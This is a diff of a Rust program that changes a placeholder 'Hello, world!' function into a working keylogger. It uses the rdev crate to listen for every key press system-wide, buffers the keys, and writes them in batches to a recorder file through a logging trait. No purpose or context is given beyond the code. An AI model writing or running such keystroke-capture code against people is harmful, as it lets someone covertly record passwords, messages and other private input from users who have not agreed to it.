@@ -1,7 +1,9 @@
+use rdev::{listen, Event, EventType};
 use std::io::Write;
 use std::net::IpAddr;
+use std::sync::{Arc, Mutex};
 
-pub trait Log {
+pub trait Log: Send + Sync {
     fn log(&self, data: &str) -> Result<(), Box<dyn std::error::Error>>;
 }
 
@@ -45,12 +47,36 @@ impl Log for FileLogger {
             .create(true)
             .append(true)
             .open(&self.recorder_file)?;
-        writeln!(file, "{}", data)?;
+        write!(file, "{}", data)?;
         Ok(())
     }
 }
 
-pub fn run(logger: Box<dyn Log>) -> Result<(), Box<dyn std::error::Error>> {
-    logger.log("Hello, world!")?;
-    Ok(())
+pub fn run(logger: Box<dyn Log>, keystroke_threshold: u32) {
+    // Create a shared, thread-safe logger and key buffer instance
+    let logger = Arc::new(Mutex::new(logger));
+    let key_buffer = Arc::new(Mutex::new(Vec::new()));
+
+    // Create the event listener with a closure that captures the logger
+    let listener = move |event: Event| {
+        if let EventType::KeyPress(key) = event.event_type {
+            if let Ok(mut buffer) = key_buffer.lock() {
+                buffer.push(format!("{:?}\n", key));
+                if buffer.len() >= keystroke_threshold as usize {
+                    if let Ok(logger) = logger.lock() {
+                        if let Err(e) = logger.log(&buffer.join("")) {
+                            eprintln!("error: {}", e);
+                            std::process::exit(1);
+                        }
+                    }
+                    buffer.clear();
+                }
+            }
+        }
+    };
+
+    if let Err(e) = listen(listener) {
+        eprintln!("error: failed to listen for keyboard event {:?}", e);
+        std::process::exit(1);
+    }
 }
